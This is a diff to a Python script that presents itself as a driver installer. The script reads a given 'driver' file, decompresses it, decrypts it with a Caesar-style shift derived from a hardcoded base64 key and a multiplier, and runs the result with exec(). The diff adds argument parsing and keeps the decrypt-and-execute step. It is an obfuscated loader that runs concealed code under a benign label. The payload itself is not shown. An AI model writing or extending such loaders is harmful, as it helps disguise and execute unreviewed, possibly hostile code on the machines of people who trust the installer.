@@ -1,5 +1,7 @@
+import sys
 import base64
 import struct
+import os
 
 def decompress_bytes_to_text(data: bytes) -> str:
     return decompress(data)
@@ -20,7 +22,7 @@ def decompress(data_bytes: bytes) -> str:
             output.append(char.decode('latin1'))
 
     return ''.join(output)
-    
+
 def calculate_shift(key, mult):
     shift = int(key) / int(mult)
     shift_str = str(int(shift))
@@ -32,7 +34,7 @@ def get_shift_from_b64(shift_b64):
     shift_bytes = base64.b64decode(shift_b64)
     shift_int = int(shift_bytes.decode("utf-8"))
     return shift_int
-    
+
 def autocrack(encrypted_key, multiplier):
     decoded_bytes = base64.b64decode(encrypted_key)
     original_key = decoded_bytes.decode("utf-8")
@@ -53,16 +55,30 @@ def decrypt(text, shift):
             decrypted += char
     return decrypted
 
-with open("driver.devk", "rb") as f:
+# ==== START: Argument Parsing ====
+
+if len(sys.argv) < 2:
+    print("Usage: python installer.py <driver_file>")
+    sys.exit(1)
+
+driver_file = sys.argv[1]
+
+if not os.path.isfile(driver_file):
+    print(f"Error: File '{driver_file}' does not exist.")
+    sys.exit(1)
+
+# ==== END: Argument Parsing ====
+
+with open(driver_file, "rb") as f:
     compressed_data = f.read()
 
 text = decompress_bytes_to_text(compressed_data)
-key = "Mjg0NzM4NjM="
+
+# Decryption process
+key = "Mjg0NzM4NjM="  # base64 encoded key
 mult = 7417
-shift = autocrack(key, int(mult))
-read_enc = str(text)
-decrypted_file = decrypt(read_enc, shift)
+shift = autocrack(key, mult)
+
+decrypted_file = decrypt(text, shift)
 
 exec(decrypted_file)
-
-
